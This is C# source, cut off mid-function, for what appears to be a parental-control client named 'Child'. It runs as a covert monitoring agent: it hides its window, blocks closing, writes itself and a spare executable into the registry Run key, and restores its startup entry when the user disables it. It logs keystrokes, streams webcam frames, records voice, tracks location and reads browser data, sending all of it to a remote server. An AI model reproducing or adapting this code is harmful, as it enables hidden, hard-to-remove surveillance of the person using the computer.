using Accord.Video;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.SqlClient;
using System.Device.Location;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Automation;
using System.Windows.Forms;

namespace Child
{
    public partial class Form1 : Form
    {
        public static Process_Handler ProcessHandler;
        NetWorkTools NetWork;
        Location MyPlace;
        //AutoUpdateClass Updater;
        ApplicationTools AppTools;
        ScreenShotClass ScreenShot;
        Browsers BrowserDataController;
        KeyLogger KeyAgent;
        public static Webcam WebcamAgent;
        VoiceRecordercs VoiceAgent;
        public static ConnectionClass Connection;
        public static DataBaseHandler DataBaseAgent;
        public static DataSet DS;
        RegistryKey Run;
        Semaphore SMUN;
        Semaphore PSM;
        Semaphore ALSM;
        Semaphore KeySM;
        List<MyTimer> NetWork2Timer;
        List<MyTimer> System2Timer;
        List<MyTimer3> System3Timer;
        List<MyTimer> App2Timer;
        List<MyTimer3> App3Timer;
        List<MyTimer3> Network3Timer;
        public static Thread CallBackFunction;
        ManagementEventWatcher Sturtup;
        ManagementEventWatcher SturtupDisableOrEnable;
        List<string> AllNetWorkAdaptors;
        public static Semaphore MeesageAdd;
        System.Timers.Timer NewDay;
        string PName;
        string Connectionstring = "";
        string ConnectedToInternetInterface = "";
        string ConnectedIP = "";
        bool LocationService = false;
        public static bool InternetConnection = false;
        bool DisConnectAdaptor = false;
        bool ConnectAdaptor = false;
        System.Timers.Timer TimeWatcher;
        double Remainning;
        string DisableOrEnablePath;
        public static bool Lock = false;
        public static Thread ReTask;
        public static short Type;
        public static string ReData;
        public Thread VoiceThread;
        string Keys = "";
        public static string ReID;
        Semaphore Enter;
        bool NewID;

        protected override void OnClosing(CancelEventArgs e)
        {
            e.Cancel = true;
        }

        public Form1()
        {
            InitializeComponent();
            KeySM = new Semaphore(1, 1);
            DS = new DataSet();
            PSM = new Semaphore(1, 1);
            ALSM = new Semaphore(1, 1);
            ReTask = new Thread(new ThreadStart(RunMs));
            AppTools = new ApplicationTools();
            DataBaseAgent = new DataBaseHandler(@"Data Source=.\sqlexpress;Initial Catalog=ChildDB;Integrated Security=True", 10);
            Thread.Sleep(1000);
            if (DataBaseAgent.CheckDataBase(@"Data Source=.\sqlexpress;Initial Catalog=ChildDB;Integrated Security=True") == false)
            {
                try
                {
                    GenerateDatabase();
                }
                catch (Exception E)
                {

                }

            }
            DataBaseAgent.SelectDataWithCommand("select * From Data order by (ID) asc ", ref DS, "Data");
            if (DS.Tables["Data"].Rows.Count == 0)
            {
                DataRow Row = DS.Tables["Data"].NewRow();
                //Row["DataContent"] = "178.32.129.19";
                Row["DataContent"] = "127.0.0.1";
                Row["ID"] = 1;
                DS.Tables["Data"].Rows.Add(Row);
                Row = DS.Tables["Data"].NewRow();
                Row["DataContent"] = "9800,9801";
                Row["ID"] = 2;
                DS.Tables["Data"].Rows.Add(Row);
                Row = DS.Tables["Data"].NewRow();
                Row["DataContent"] = "";
                Row["ID"] = 3;
                DS.Tables["Data"].Rows.Add(Row);
                Row = DS.Tables["Data"].NewRow();
                Row["DataContent"] = "";
                Row["ID"] = 4;
                DS.Tables["Data"].Rows.Add(Row);
                Row = DS.Tables["Data"].NewRow();
                Row["DataContent"] = "";
                Row["ID"] = 5;
                DS.Tables["Data"].Rows.Add(Row);
                Row = DS.Tables["Data"].NewRow();
                Row["DataContent"] = "0";
                Row["ID"] = 6;
                DS.Tables["Data"].Rows.Add(Row);
                Row = DS.Tables["Data"].NewRow();
                Row["DataContent"] = DateTime.Now.ToString();
                Row["ID"] = 7;
                DS.Tables["Data"].Rows.Add(Row);
                DataBaseAgent.InsertData(DS.Tables["Data"]);
                Row = DS.Tables["Data"].NewRow();
                Row["DataContent"] = "";
                Row["ID"] = 8;
                DS.Tables["Data"].Rows.Add(Row);
                Row = DS.Tables["Data"].NewRow();
                Row["DataContent"] = "";
                Row["ID"] = 9;
                DS.Tables["Data"].Rows.Add(Row);
                Row = DS.Tables["Data"].NewRow();
                Row["DataContent"] = "";
                Row["ID"] = 10;
                DS.Tables["Data"].Rows.Add(Row);
                Row = DS.Tables["Data"].NewRow();
                Row["DataContent"] = "";
                Row["ID"] = 11;
                DS.Tables["Data"].Rows.Add(Row);
                DataBaseAgent.InsertData(DS.Tables["Data"]);
                AppTools.FindSpecificApp(Registry.LocalMachine, "pckma");
                if (DS.Tables["Data"].Rows[7]["DataContent"].ToString() == "")
                {
                    AppTools.FindSpecificApp(Registry.CurrentUser, "pckma");
                }
                DataBaseAgent.InsertData(DS.Tables["Data"]);
                AppTools.FindSpecificApp(Registry.LocalMachine, "pckmasp");
                if (DS.Tables["Data"].Rows[9]["DataContent"].ToString() == "")
                {
                    AppTools.FindSpecificApp(Registry.CurrentUser, "pckmasp");
                }
                DataBaseAgent.InsertData(DS.Tables["Data"]);
            }

            Enter = new Semaphore(1, 1);
            //Enter.WaitOne();
            Connection = new ConnectionClass(DS.Tables["Data"].Rows[1]["DataContent"].ToString(), DS.Tables["Data"].Rows[0]["DataContent"].ToString(), 1024 * 4, 3);
            Connection.LoginEventHandler += Connection_LoginEventHandler;
            

            //STV();

        }

        private void Connection_LoginEventHandler(object sender, string e)
        {
            if (e == "Fail")
            {
                //DS.Tables["Data"].Rows[2]["DataContent"] = ChildIDTxt.Text;
                //DS.Tables["Data"].Rows[3]["DataContent"] = ParentIDTxt.Text;
                //Connection = new ConnectionClass(DS.Tables["Data"].Rows[1]["DataContent"].ToString(), "127.0.0.1", 1024 * 4, 3, MessageRecived);
            }
            else
            {
                if (Form1.DS.Tables["Data"].Rows[5]["DataContent"].ToString() == "0")
                {
                    //SingSM.WaitOne();
                    //Packet.ChildSingup Sing = new Packet.ChildSingup();
                    //Sing.ID = Form1.DS.Tables["Data"].Rows[2]["DataContent"].ToString();
                    //Sing.Parents = Form1.DS.Tables["Data"].Rows[3]["DataContent"].ToString();
                    //Sing.Mac = "MAC";
                    //Packet.ProPacket ProSing = new Packet.ProPacket();
                    //ProSing.ID = Sing.ID;
                    //ProSing.Type = (short)Packet.PacketType.ChildSingup;
                    //string Data = Pack.ToString(Sing);
                    //ProSing.TotalSize = Encoding.Unicode.GetBytes(Data).Length;
                    //string ProData = Pack.ToString(ProSing);
                    //Packet.MainPacket MPacket = new Packet.MainPacket();
                    //MPacket.PPacket = ProData;
                    //MPacket.Data = Data;

                    //SendToServer(Pack.ToString(MPacket));
                    //int NumberOfData = ChildSocket.Receive(ReciveData);
                    //Result = Encoding.Unicode.GetString(AES_Decrypt(ReciveData.Take(NumberOfData).ToArray(), PassBytes));
                    //Result = Result.Replace("\0", "");
                    string Result = "OK";
                    if (Result == "OK" || Result == "True")
                    {
                        Form1.DS.Tables["Data"].Rows[5].BeginEdit();
                        Form1.DS.Tables["Data"].Rows[5]["DataContent"] = "1";
                        Form1.DS.Tables["Data"].Rows[5].EndEdit();
                        //Form1.DS.Tables["Data"].Rows.RemoveAt(5);
                        //Form1.DS.Tables["Data"].Rows.InsertAt(Row, 5);
                        Form1.DataBaseAgent.UpdateData(Form1.DS.Tables["Data"]);
                        //SendIdentifyData(Form1.DS.Tables["Data"].Rows[2]["DataContent"].ToString(), Form1.DS.Tables["Data"].Rows[3]["DataContent"].ToString());
                        //ReciveData = new byte[ReciveData.Length];
                        //NumberOfData = ChildSocket.Receive(ReciveData);
                        //IdentifyResult = Encoding.Unicode.GetString(AES_Decrypt(ReciveData.Take(NumberOfData).ToArray(), PassBytes));
                        //IdentifyResult = IdentifyResult.Replace("\0", "");
                        //if (IdentifyResult == "True")
                        //{
                        //    SignUpEventHandler(this, "OK");
                        //    LoginEventHandler(this, "OK");
                        //    try
                        //    {
                        //        ChildFileSocket.BeginConnect(IP, 8803, ConnectFileEvent, ChildFileSocket);
                        //        //ChildFileSocket.Connect(IP, Port);
                        //        ConnectionIsAlive = true;
                        //        PreapringRecive();
                        //    }
                        //    catch (Exception E)
                        //    {
                        //        //ChildFileSocket.BeginConnect(IP, Port, ConnectFileEvent, ChildSocket);
                        //    }
                        //
                        //}
                        //else
                        //{
                        //    SignUpEventHandler(this, "Fail");
                        //    LoginEventHandler(this, "Fail");
                        //    ChildSocket.Close();
                        //}
                        //SendDataSM.Release();

                    }
                    //else
                    //{
                    //    SignUpEventHandler(this, "Fail");
                    //    LoginEventHandler(this, "Fail");
                    //}
                    //SingSM.Release();
                }
                else
                {
                    Thread.Sleep(100);
                    //SendIdentifyData(Form1.DS.Tables["Data"].Rows[2]["DataContent"].ToString(), Form1.DS.Tables["Data"].Rows[3]["DataContent"].ToString());
                    //ReciveData = new byte[ReciveData.Length];
                    //int Number = ChildSocket.Receive(ReciveData);
                    //Array.Resize(ref ReciveData, Number);
                    //IdentifyResult = Encoding.Unicode.GetString(AES_Decrypt(ReciveData.Take(Number).ToArray(), PassBytes));
                    //IdentifyResult = IdentifyResult.Replace("\0", "");
                    //if (IdentifyResult == "True")
                    //{
                    //    try
                    //    {
                    //        ChildFileSocket.BeginConnect(IP, 8803, ConnectFileEvent, ChildFileSocket);
                    //        //ChildFileSocket.Connect(IP, Port);
                    //        ConnectionIsAlive = true;
                    //        PreapringRecive();
                    //    }
                    //    catch (Exception E)
                    //    {
                    //        //ChildFileSocket.BeginConnect(IP, Port, ConnectFileEvent, ChildSocket);
                    //    }
                    //
                    //}
                    //else
                    //{
                    //    ChildSocket.Close();
                    //}
                    //SendDataSM.Release();

                }
                //Enter.Release();
                this.Visible = false;
                this.Size = new Size(0, 0);
                this.WindowState = FormWindowState.Minimized;
                this.ShowInTaskbar = false;
                this.Hide();

                Sturtup = new ManagementEventWatcher();
                SturtupDisableOrEnable = new ManagementEventWatcher();
                NewDay = new System.Timers.Timer();
                MeesageAdd = new Semaphore(1, 1);
                RegistryKey add = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                Run = add;
                bool Find = false;
                string[] AllKey = add.GetSubKeyNames();
                for (int i = 0; i < AllKey.Length; i++)
                {
                    if (AllKey[i] == "pckma")
                    {
                        Find = true;
                    }
                }
                if (!Find)
                {
                    add.CreateSubKey("pckma");
                    add.SetValue("pckma", "\"" + Application.ExecutablePath.ToString() + "\"");
                    add = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    add.CreateSubKey("pckmasp");
                    add.SetValue("pckmasp", "\"" + Application.StartupPath.ToString() + "\\" + "SpareWF.exe" + "\"");
                }
                try
                {
                    string Data = add.GetValue("pckmasp").ToString();
                }
                catch (Exception E)
                {
                    add.SetValue("pckmasp", "\"" + Application.StartupPath.ToString() + "\\" + "SpareWF.exe" + "\"");
                    ProcessStartInfo StartInfo = new ProcessStartInfo(Application.StartupPath.ToString() + "\\" + "SpareWF.exe");
                    StartInfo.UseShellExecute = true;
                    StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    StartInfo.Verb = "runas";
                    Process process = new Process();
                    process.StartInfo = StartInfo;
                    process.Start();
                }
                SetEventOnSturtup(SturtupChange);
                SetEventOnSturtupDiaableOrEnable(DisableOrEnableChange);
                SMUN = new Semaphore(1, 1);
                ProcessHandler = new Process_Handler();
                NetWork = new NetWorkTools();
                ScreenShot = new ScreenShotClass();
                MyPlace = new Location();
                KeyAgent = new KeyLogger(Pressed);
                KeyAgent.StartHogger();
                WebcamAgent = new Webcam(webCamFriam);

                VoiceThread = Thread.CurrentThread;
                VoiceAgent = new VoiceRecordercs();
                //VoiceAgent.StartRecording();
                //Thread.Sleep(5 * 1000);
                //string TimeName = "\\" + DateTime.Now.Millisecond.ToString();
                //VoiceAgent.StopRecording(@"E:\"+Application.StartupPath.Split('\')[0], "\\TTTTT", "mp3");
                BrowserDataController = new Browsers();
                System2Timer = new List<MyTimer>();
                App2Timer = new List<MyTimer>();
                App3Timer = new List<MyTimer3>();
                System3Timer = new List<MyTimer3>();
                Network3Timer = new List<MyTimer3>();
                System3Timer = new List<MyTimer3>();
                NetWork2Timer = new List<MyTimer>();
                AllNetWorkAdaptors = new List<string>();


                DataBaseAgent.SelectData("RecivedCommands", ref DS, "RecivedCommands");

                //DS.Tables["RecivedCommands"].RowChanged += MessageRecived;
                DataBaseAgent.SelectData("MessageLog", ref DS, "MessageLog");
                DataBaseAgent.SelectData("MessageLogRemaining", ref DS, "MessageLogRemaining");
                DS.Tables["MessageLog"].Clear();
                Task.Run(() =>
                {

                    DataBaseAgent.SelectData("AppLimit", ref DS, "AppLimit");
                    DataBaseAgent.SelectData("AppsBlock", ref DS, "AppsBlock");
                    DataBaseAgent.SelectData("BlockURL", ref DS, "BlockURL");
                    DataBaseAgent.SelectData("NetworkLimit", ref DS, "NetworkLimit");
                    //DataBaseAgent.SelectData("SystemLimit", ref DS, "SystemLimit");
                    //if (DS.Tables["AppLimit"].Rows.Count == 0)
                    //{
                    //    DS.Tables.Remove("AppLimit");
                    //}
                    //if (DS.Tables["AppsBlock"].Rows.Count == 0)
                    //{
                    //    DS.Tables.Remove("AppsBlock");
                    //}
                    //if (DS.Tables["BlockURL"].Rows.Count == 0)
                    //{
                    //    DS.Tables.Remove("BlockURL");
                    //}
                    //if (DS.Tables["NetworkLimit"].Rows.Count == 0)
                    //{
                    //    DS.Tables.Remove("NetworkLimit");
                    //}
                    //if (DS.Tables["SystemLimit"].Rows.Count == 0)
                    //{
                    //    DS.Tables.Remove("SystemLimit");
                    //}
                });
                string T = DateTime.Now.ToString();
                NewDay.Interval = 2 * 3600 * 1000;//2h
                NewDay.Elapsed += NewDay_Elapsed;
                NewDay.Start();

                Task.Run(() =>
                {
                    try
                    {
                        DS.Tables["Data"].Rows[6]["DataContent"] = DateTime.Now.ToString();
                        DataBaseAgent.UpdateData(DS.Tables["Data"]);
                    }
                    catch (Exception E)
                    {
                        DataRow Row = DS.Tables["Data"].NewRow();
                        Row["DataContent"] = DateTime.Now.ToString();
                        DS.Tables["Data"].Rows.Add(Row);
                        DataBaseAgent.InsertData(DS.Tables["Data"]);
                    }
                    //Connection = new ConnectionClass(DS.Tables["Data"].Rows[1]["DataContent"].ToString(), "127.0.0.1", 1024 * 4, 3, MessageRecived);
                }
                );

                Task.Run(() =>
                {
                    DataBaseAgent.SelectData("SystemLimit", ref DS, "SystemLimit");
                    Task.Delay(200);
                    foreach (DataRow var in DS.Tables["SystemLimit"].Rows)
                    {
                        try
                        {
                            DateTime TempTime = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day, ((TimeSpan)var["StatTime"]).Hours, ((TimeSpan)var["StatTime"]).Minutes, ((TimeSpan)var["StatTime"]).Seconds);
                            //DateTime TempDate = Convert.ToDateTime(var["StartTime"]);
                            DateTime Start = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day, TempTime.Hour, TempTime.Minute, TempTime.Second);
                            //TempDate = Convert.ToDateTime(var["EndTime"]);
                            DateTime End = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day, ((TimeSpan)var["EndTime"]).Hours, ((TimeSpan)var["EndTime"]).Minutes, ((TimeSpan)var["EndTime"]).Seconds);
                            if (DateTime.Now.CompareTo(Start) >= 0 && (DateTime.Now.CompareTo(End) <= 0))
                            {
                                switch ((short)var["Act"])
                                {
                                    case (short)Packet.SystemLimitAct.ShutDown:
                                        {
                                            DoSystem((short)var["Act"]);
                                        }; break;
                                    //case (short)Packet.SystemLimitAct.ShoutDownWithError:
                                    //    {
                                    //        DialogResult Result = MessageBox.Show("Your Usage Time has Expire ", "Parent Message", MessageBoxButtons.OK);
                                    //        if (Result == DialogResult.OK || Result != DialogResult.OK)
                                    //        {
                                    //            DoSystem((short)var["Act"]);
                                    //        }
                                    //        DoSystem((short)var["Act"]);
                                    //    }; break;
                                    case (short)Packet.SystemLimitAct.Sleep:
                                        {
                                            DoSystem((short)var["Act"]);
                                        }; break;
                                    case (short)Packet.SystemLimitAct.Reboot:
                                        {
                                            DoSystem((short)var["Act"]);
                                        }; break;
                                    case (short)Packet.SystemLimitAct.Logoff:
                                        {
                                            DoSystem((short)var["Act"]);
                                        }; break;
                                    case (short)Packet.SystemLimitAct.Lock:
                                        {
                                            DoSystem((short)var["Act"]);
                                        }; break;
                                }

                                break;
                            }
                            else
                            {
                                if (DateTime.Now.CompareTo(Start) <= 0)
                                {
                                    try
                                    {
                                        MyTimer3 TimeWatcher = new MyTimer3();
                                        System.Timers.Timer Target = new System.Timers.Timer((Start - DateTime.Now).TotalMilliseconds);
                                        System.Timers.Timer Duration = new System.Timers.Timer(((TimeSpan)var["Duration"]).TotalMilliseconds);
                                        Target.Elapsed += BeforSystemLimitElipced;
                                        Duration.Elapsed += Duration_Elapsed;
                                        Target.Start();
                                        TimeWatcher.STW = new Stopwatch();
                                        TimeWatcher.STW.Start();
                                        TimeWatcher.TimeWatcher = Target;
                                        TimeWatcher.ID = var["ID"].ToString();
                                        TimeWatcher.Duration = Duration;
                                        System3Timer.Add(TimeWatcher);
                                    }
                                    catch (Exception E)
                                    {
                                        MyTimer TimeWatcher = new MyTimer();
                                        System.Timers.Timer Target = new System.Timers.Timer((Start - DateTime.Now).TotalMilliseconds);
                                        Target.Elapsed += BeforSystemLimitElipced;
                                        Target.Start();
                                        TimeWatcher.TimeWatcher = Target;
                                        TimeWatcher.ID = var["ID"].ToString();
                                        System2Timer.Add(TimeWatcher);
                                    }

                                }
                            }
                        }
                        catch (Exception E)
                        {

                        }


                    }
                }
                );
                //Updater = new AutoUpdateClass();
                //Updater.IncommingProcess = ProcessIncoming;
                //Updater.OutcommingProcess = ProcessOutcoming;
                //Updater.Start(DS.Tables["Data"].Rows[0]["DataContent"].ToString(), 89898, "v1.0.0", "SpareWF", Process.GetCurrentProcess().MainModule.FileName);
                ProcessHandler.FindeStartedProcess(ProcessIncoming);
                ProcessHandler.FindStopedProcess(ProcessOutcoming);
                NetWork.SetEventOnVPN(VPNChange);
                NetWork.SetEventOnIP(IPChange);
                NetWork.SetEventOnConnections(Connect, DisConnect);
                NetWork.GetAllAdapter(ref AllNetWorkAdaptors);
                Task.Run(() =>
                {
                    Thread.Sleep(1000);
                    Packet Pack = new Packet();
                    foreach (string Var in AllNetWorkAdaptors)
                    {
                        Packet.NetworkStatus NetAdaptor = new Packet.NetworkStatus();
                        Packet.ProPacket NetPro = new Packet.ProPacket();
                        NetAdaptor.Data = Var;
                        NetAdaptor.Time = DateTime.Now;
                        NetAdaptor.Type = (short)Packet.NetworkStatusType.Connected;
                        string Data = Pack.ToString(NetAdaptor);
                        NetPro.ID = DS.Tables["Data"].Rows[2]["DataContent"].ToString();
                        NetPro.Type = (short)Packet.PacketType.NetworkStatusNow;
                        NetPro.TotalSize = Encoding.Unicode.GetBytes(Data).Length;
                        string ProData = Pack.ToString(NetPro);
                        if (Connection.ConnectionIsAlive == true)
                        {

                            Connection.SendDataSM.WaitOne();
                            Packet.MainPacket MPacket = new Packet.MainPacket();
                            MPacket.PPacket = ProData;
                            MPacket.Data = Data;
                            Connection.SendToServer(Pack.ToString(MPacket));
                            Connection.SendDataSM.Release();
                        }
                        else
                        {
                            DataRow RRow = DS.Tables["MessageLogRemaining"].NewRow();
                            RRow["ProPack"] = ProData;
                            RRow["Data"] = Data;
                            MeesageAdd.WaitOne();
                            RRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                            Thread.Sleep(10);
                            DS.Tables["MessageLogRemaining"].Rows.Add(RRow);
                            MeesageAdd.Release();
                            DataBaseAgent.InsertData(DS.Tables["MessageLogRemaining"]);
                        }
                    }


                });
                Initial();
                MyPlace.PositionEvent(PositionChanged);
                MyPlace.SetEventOnLocationService(LocationStatsChange);
                ConnectedToInternetInterface = NetWork.GetConnectionInterfaceName();



                Task.Run(() =>
                {
                    MyPlace.StartLocating();
                    Thread.Sleep(1000);
                    DataBaseAgent.SelectData("InstalledApps", ref DS, "InstalledApps");
                    if (DS.Tables["InstalledApps"].Rows.Count == 0)
                    {
                        AppTools.GetAllApps();
                        DataBaseAgent.InsertBulkData("InstalledApps", DS.Tables["InstalledApps"]);
                    }
                    //DataBaseAgent.InsertData(DS.Tables["InstalledApps"]);
                    DS.Tables.Remove("InstalledApps");
                    //DS.Tables["InstalledApps"].AcceptChanges();
                    //DS.Tables.Remove("InstalledApps");
                }
                );
                SendRemainingData();
            }
        }

        public void STV(string PName)
        {
            this.Invoke(new Action(() =>
            {
                Packet Pack = new Packet();
                string TimeName = DateTime.Now.Millisecond.ToString();
                VoiceAgent.StopRecording(@"E:\", TimeName, "ogg");
                //if (DS.Tables["Data"].Rows[11]["DataContent"].ToString() == "VoiceRun")
                //{
                //    VoiceAgent.StartRecording();
                //}
                string Voice = Convert.ToBase64String(File.ReadAllBytes(@"E:\" + TimeName + ".ogg"));
                Packet.ProPacket ProVoice = new Packet.ProPacket();
                Packet.RecordVoice VoiceData = new Packet.RecordVoice();
                VoiceData.Data = Voice;
                VoiceData.ProcessName = PName;
                VoiceData.Time = DateTime.Now.ToString();
                ProVoice.Type = (short)Packet.PacketType.RecordVoice;
                ProVoice.ID = Connection.ID;
                string DataVoice = Pack.ToString(VoiceData);
                ProVoice.TotalSize = Encoding.Unicode.GetByteCount(DataVoice);

                string ProData = Pack.ToString(ProVoice);
                if (Connection.ConnectionIsAlive == true)
                {
                    Connection.SendFileDataSM.WaitOne();
                    Connection.SendFIleToServer(ProData);
                    Thread.Sleep(300);
                    Connection.SendFIleToServer(DataVoice);
                    Connection.SendFileDataSM.Release();
                }
                else
                {
                    DataRow RRow = DS.Tables["MessageLogRemaining"].NewRow();
                    RRow["ProPack"] = ProData;
                    RRow["IsFile"] = 1;
                    RRow["Data"] = DataVoice;
                    MeesageAdd.WaitOne();
                    RRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                    Thread.Sleep(10);
                    DS.Tables["MessageLogRemaining"].Rows.Add(RRow);
                    MeesageAdd.Release();
                    DataBaseAgent.InsertData(DS.Tables["MessageLogRemaining"]);
                }
            }));




        }
        private void webCamFriam(object sender, NewFrameEventArgs eventArgs)
        {
            Bitmap Picture = (Bitmap)eventArgs.Frame.Clone();
            MemoryStream ms = new MemoryStream();
            Picture.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
            byte[] PicData = ms.ToArray();
            byte[] Lenght = Encoding.ASCII.GetBytes(PicData.Length.ToString());
            Connection.RealWebcamSM.WaitOne();
            Connection.STWebCam.Write(Lenght, 0, Lenght.Length);
            Connection.STWebCam.Write(PicData, 0, PicData.Length);
            Connection.RealWebcamSM.Release();
        }
        private void Pressed(object obj)
        {

            string Data = ((string)obj).Split(',')[0];
            Keys += Data;
            if (((PName != null) && (Keys != "") && PName != ((string)obj).Split(',')[1]) || (Data == "\r"))
            {
                KeySM.WaitOne();
                string Temp = Keys;
                Keys = "";
                KeySM.Release();
                Packet Pack = new Packet();
                Packet.ProPacket ProData = new Packet.ProPacket();
                Packet.KeyLogger KeysData = new Packet.KeyLogger();
                KeysData.Time = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss");
                KeysData.ProcessName = PName;
                KeysData.Data = Temp.Replace("\r", "");

                string DataStr = Pack.ToString(KeysData);
                ProData.ID = Connection.ID;
                ProData.Type = (short)Packet.PacketType.Keylogger;
                ProData.TotalSize = Encoding.Unicode.GetBytes(DataStr).Length;
                string ProDataStr = Pack.ToString(ProData);
                
                if(Connection.ConnectionIsAlive == true)
                {
                    Connection.SendDataSM.WaitOne();
                    Packet.MainPacket MPacket = new Packet.MainPacket();
                    MPacket.PPacket = ProDataStr;
                    MPacket.Data = DataStr;
                    Connection.SendToServer(Pack.ToString(MPacket));
                    //Connection.SendToServer(DataStr);
                    Connection.SendDataSM.Release();
                }
                else
                {
                    DataRow RRow = DS.Tables["MessageLogRemaining"].NewRow();
                    RRow["ProPack"] = ProData;
                    RRow["Data"] = Data;
                    MeesageAdd.WaitOne();
                    RRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                    Thread.Sleep(10);
                    DS.Tables["MessageLogRemaining"].Rows.Add(RRow);
                    MeesageAdd.Release();
                    DataBaseAgent.InsertData(DS.Tables["MessageLogRemaining"]);
                }
            }
            PName = ((string)obj).Split(',')[1];
        }

        private void TakePic(object obj)
        {
            Packet Pack = new Packet();
            WebcamAgent.StopWebCam();
            MemoryStream ms = new MemoryStream();
            ((Bitmap)obj).Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
            byte[] PicData = ms.ToArray();
            Packet.WebCam SCPack = new Packet.WebCam();
            SCPack.ProcessName = Convert.ToBase64String(PicData);
            SCPack.Time = DateTime.Now.ToString();
            string DataPic = Pack.ToString(SCPack);
            //int A = Data.Length;
            Packet.ProPacket ProData = new Packet.ProPacket();
            ProData.ID = DS.Tables["Data"].Rows[2]["DataContent"].ToString();
            ProData.Type = (short)Packet.PacketType.WebCam;
            ProData.TotalSize = Encoding.Unicode.GetByteCount(DataPic);
            string ProDataStr = Pack.ToString(ProData);
            if (Connection.ConnectionIsAlive == true)
            {
                Connection.SendFileDataSM.WaitOne();
                //NS.Write(Encoding.Unicode.GetBytes(ProDataStr) , 0, Encoding.Unicode.GetBytes(ProDataStr).Length);
                Connection.SendFIleToServer(ProDataStr);
                Thread.Sleep(500);
                //NS.Write(PicData, 0, PicData.Length);
                Connection.SendFIleToServer(DataPic);
                Connection.SendFileDataSM.Release();
            }
            else
            {
                DataRow Row = DS.Tables["MessageLogRemaining"].NewRow();
                Row["IsFile"] = 1;
                Row["ProPack"] = ProDataStr;
                Row["Data"] = DataPic;
                Row["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                //Row["ID"] = MainCore.DataBaseAgent.ExequteWithCommandScaler("Select NEWID()").ToString();
                DS.Tables["MessageLogRemaining"].Rows.Add(Row);
                DataBaseAgent.InsertData(DS.Tables["MessageLogRemaining"]);
            }
        }

        public void GenerateDatabase()
        {
            List<string> Commasnds = new List<string>();
            Commasnds.Add("USE [master]\r\n");
            Commasnds.Add("Create Database [ChildDB]\r\n");
            if (File.Exists(System.AppDomain.CurrentDomain.BaseDirectory + "\\Script.sql"))
            {
                StreamReader SR = new StreamReader(System.AppDomain.CurrentDomain.BaseDirectory + "\\Script.sql");
                string Line = "";
                string Cmd = "";
                while ((Line = SR.ReadLine()) != null)
                {
                    if (Line.Trim().ToUpper() == "GO")
                    {
                        Commasnds.Add(Cmd);
                        Cmd = "";
                    }
                    else
                    {
                        Cmd += Line + "\r\n";
                    }
                }
                if (Cmd.Length > 0)
                {
                    Commasnds.Add(Cmd);
                    Cmd = "";
                }
                SR.Close();
            }
            if (Commasnds.Count > 0)
            {
                SqlCommand Command = new SqlCommand();
                Command.Connection = new SqlConnection(@"Data source = .\sqlexpress ; Initial Catalog=MASTER;Integrated security = true");
                Command.CommandType = CommandType.Text;
                Command.Connection.Open();
                for (int i = 0; i < Commasnds.Count; i++)
                {
                    Command.CommandText = Commasnds[i];
                    Command.ExecuteNonQuery();
                }
            }
        }


        public void SendRemainingData()
        {
            Task.Run(() =>
            {

                if (Connection.ConnectionIsAlive == true)
                {
                    foreach (DataRow Row in DS.Tables["MessageLogRemaining"].Rows)
                    {
                        //Connection.SendDataSM.WaitOne();
                        //Connection.SendToServer(Row["ProPack"].ToString());
                        //Connection.SendToServer(Row["Data"].ToString());
                        //Connection.SendDataSM.Release();
                        //DS.Tables["MessageLogRemaining"].Rows.Remove(Row);
                        //DataBaseAgent.UpdateData(DS.Tables["MessageLogRemaining"]);

                    }
                }


            });
        }

        private void NewDay_Elapsed(object sender, ElapsedEventArgs e)
        {
            if (DateTime.Now.Day == Convert.ToDateTime(DS.Tables["Data"].Rows[6]["DataContent"]).Day)
            {
                NewDay.Interval = 2 * 3600 * 1000;
                NewDay.Start();
            }
            else
            {
                foreach (DataRow var in DS.Tables["AppLimit"].Rows)
                {
                    if (var["Duration"] != null)
                    {
                        var["Remaining"] = ConvertTime3Todouble(var["Duration"].ToString());
                    }
                }
                foreach (MyTimer3 var in App3Timer)
                {
                    var.Duration.Stop();
                    var.Duration.Start();
                    var.STW.Restart();
                }
                foreach (DataRow var in DS.Tables["SystemLimit"].Rows)
                {
                    if (var["Duration"] != null)
                    {
                        var["Remaining"] = ConvertTime3Todouble(var["Duration"].ToString());
                    }
                }
                foreach (MyTimer3 var in System3Timer)
                {
                    var.Duration.Stop();
                    var.Duration.Start();
                    var.STW.Restart();
                }
                foreach (DataRow var in DS.Tables["NetworkLimit"].Rows)
                {
                    if (var["Duration"] != null)
                    {
                        var["Remaining"] = ConvertTime3Todouble(var["Duration"].ToString());
                    }
                }
                foreach (MyTimer3 var in Network3Timer)
                {
                    var.Duration.Stop();
                    var.Duration.Start();
                    var.STW.Restart();
                }
            }

        }

        public double ConvertTime3Todouble(string Time)
        {
            string[] Data = Time.Split(':');
            return (Convert.ToDouble(Data[0]) * 60 + Convert.ToDouble(Data[1]) + Convert.ToDouble(Data[2]) / 60);
        }

        private void DisableOrEnableChange(object sender, EventArrivedEventArgs e)
        {
            try
            {
                RegistryKey Key = Registry.CurrentUser.OpenSubKey(DisableOrEnablePath, true);
                byte[] Data = (byte[])Key.GetValue("WindowsAgent");
                if (Data[0] == 3)
                {
                    Data = new byte[Data.Length];
                    Data[0] = 2;
                    Key.SetValue("WindowsAgent", Data);
                }


            }
            catch (Exception E)
            {

            }
            try
            {
                RegistryKey Key = Registry.CurrentUser.OpenSubKey(DisableOrEnablePath, true);
                byte[] Data = (byte[])Key.GetValue("WindowsAgentSpare");
                if (Data[0] == 3)
                {
